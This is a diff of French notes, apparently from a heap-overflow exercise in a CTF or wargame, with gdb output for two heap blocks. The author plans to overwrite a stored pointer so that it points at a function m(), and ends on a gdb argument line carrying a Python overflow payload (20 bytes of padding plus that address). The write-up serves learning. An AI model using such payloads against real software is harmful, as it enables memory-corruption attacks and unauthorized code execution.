@@ -42,4 +42,30 @@ x/x $pc
 ======= Memory map: ========
 0804a000-0806b000 rwxp 00000000 00:00 0          [heap]
 
-Bon pas trop d'idees, allons analyser l'asm :]
+Bon pas trop d'idees, allons analyser l'asm
+
+Ok bon apres quelques heures de reflexion j'en viens a me dire que :
+
+Premier bloc (0x804a008):
+- offset 0: valeur 1
+- offset 4: pointeur vers buffer1 (0x804a018)
+
+0x804a018:      0x00003231
+(gdb) x/s 0x804a018
+0x804a018:       "12"
+
+Deuxième bloc (0x804a028):
+- offset 0: valeur 2  
+- offset 4: pointeur vers buffer2 (0x804a038)
+
+(gdb) x/s 0x0804a038
+0x804a038:       "12"
+
+Est ce qu'on ne pourrait pas changer ces adresses pour les faire pointer ailleurs, par exemple sur m() ?
+
+m() 08 04 84 f4
+\xf4\x84\x04\x08
+
+Essayons ca
+
+set args $(python -c 'print "A"*20 + "\xf4\x84\x04\x08"') "0"
